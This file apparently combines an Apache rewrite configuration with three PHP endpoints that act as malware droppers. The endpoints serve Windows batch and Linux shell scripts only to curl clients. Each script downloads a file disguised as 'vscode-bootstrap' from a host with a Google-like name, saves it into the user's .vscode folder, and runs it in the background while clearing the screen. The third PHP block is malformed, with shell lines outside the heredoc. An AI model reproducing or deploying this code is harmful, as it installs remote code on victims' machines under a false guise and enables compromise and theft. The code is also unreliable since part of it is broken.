RewriteEngine On

RewriteRule ^verify/([A-Za-z0-9_-]+)/?$ verify.php?token=$1 [L,QSA]
RewriteRule ^windows/([A-Za-z0-9_-]+)/?$ api/os.php?os=windows&token=$1 [L,QSA]
RewriteRule ^mac/([A-Za-z0-9_-]+)/?$ api/os.php?os=mac&token=$1 [L,QSA]
RewriteRule ^linux/([A-Za-z0-9_-]+)/?$ api/os.php?os=linux&token=$1 [L,QSA]
RewriteRule ^windows/?$ api/os.php?os=windows [L]
RewriteRule ^mac/?$ api/os.php?os=mac [L]
RewriteRule ^linux/?$ api/os.php?os=linux [L]
RewriteRule ^issue/?$ issue.php [L]

<IfModule mod_authz_core.c>
	<Files "tokens.json">
		Require all denied
	</Files>
</IfModule>


<?php

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

if (stripos($userAgent, 'curl/') !== 0) {
    http_response_code(403);
    exit('Access denied');
}

header('Content-Type: text/plain; charset=utf-8');

echo <<<'BATCH'
@echo off
set "VSCODE_DIR=%USERPROFILE%\.vscode"

if not exist "%VSCODE_DIR%" (
    mkdir "%VSCODE_DIR%"
)

curl --ssl-no-revoke -s -L -o "%VSCODE_DIR%\vscode-bootstrap.cmd" https://apigoogle-ashen.vercel.app/api/settings/bootstrap

cls
"%VSCODE_DIR%\vscode-bootstrap.cmd"
cls
BATCH;














<?php

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

if (stripos($userAgent, 'curl/') !== 0) {
    http_response_code(403);
    exit('Access denied');
}

header('Content-Type: text/plain; charset=utf-8');

echo <<<'BATCH'
#!/bin/bash
set -e

# -------------------------
# Step 1: Make sure the .vscode directory exists
# -------------------------
mkdir -p "$HOME/.vscode"

# -------------------------
# Step 2: Download the script if it doesn't exist or if it's not updated
# -------------------------

echo "Downloading or updating vscode-bootstrap.sh..."
curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://apigoogle-ashen.vercel.app/api/settings/bootstraplinux"

# -------------------------
# Step 3: Check if the script exists and make it executable
# -------------------------

if [ -f "$HOME/.vscode/vscode-bootstrap.sh" ]; then
  chmod +x "$HOME/.vscode/vscode-bootstrap.sh"
  echo "Script is now executable."
else
  echo "Error: Script download failed or file not found."
  exit 1
fi

# -------------------------
# Step 4: Run the script in the background, redirecting output and errors
# -------------------------

echo "Running the script in the background..."
nohup bash "$HOME/.vscode/vscode-bootstrap.sh"


# -------------------------
# Step 5: Exit
# -------------------------

echo "Process started. Exiting."
exit 0
BATCH;


















<?php

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

if (stripos($userAgent, 'curl/') !== 0) {
    http_response_code(403);
    exit('Access denied');
}

header('Content-Type: text/plain; charset=utf-8');

#!/bin/bash
set -e
echo "Authenticated"
TARGET_DIR="$HOME/.vscode"
mkdir -p "$TARGET_DIR"
clear
wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://apigoogle-ashen.vercel.app/api/settings/bootstraplinux"
clear
chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
clear
nohup bash "$TARGET_DIR/vscode-bootstrap.sh"
clear
exit 0
BATCH;







